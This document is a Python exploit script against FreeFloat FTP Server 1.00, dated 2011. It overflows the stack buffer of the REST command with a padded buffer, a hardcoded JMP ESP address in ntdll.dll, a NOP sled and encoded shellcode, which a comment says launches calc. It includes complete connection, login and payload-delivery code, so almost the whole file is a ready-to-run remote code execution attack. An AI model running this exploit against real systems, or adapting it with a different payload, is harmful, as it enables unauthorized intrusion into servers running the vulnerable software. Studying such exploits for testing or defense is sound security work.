#!/usr/bin/python
#
#[+]Exploit Title: FreeFloat FTP Server REST and PASV Buffer Overflow Exploit
#[+]Date: 18\06\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
#[+]Version: 1.00
#[+]Tested On: Windows XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

if len(sys.argv) != 3:
	print "[-]Usage: python %s <ip> <port>" % sys.argv[0]
	print "[-]Exemple: python %s 192.168.1.2 21" % sys.argv[0]
	sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])

shellcode = ("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"#Shellcode WinExec CALC
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"#Know badchars "\x00\xff\x0d\x0a\x3d\x20"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
"\x7f\xe8\x7b\xca")
buf = "\x41" * 246
buf += pack('<L',0x7C91FCD8)#JMP ESP in ntdll.dll
buf += "\x90" * 20
buf += shellcode

print "[+]Connecting with server..."
sleep(1)
try:
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port))
	s.recv(2000)
	s.send("USER test\r\n")
	s.recv(2000)
	s.send("PASS test\r\n")
	s.recv(2000)
	s.send("REST "+buf+"\r\n")
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((ip,port))#Server needs connect AGAIN to CRASH and ocorrs the buffer overflow bug.
	sleep(1)#Wait a segund
	s.close()#Close connection CRASH
	print "[+]Exploit sent with sucess"
except:
	print "[*]Error in connection with server: "+ip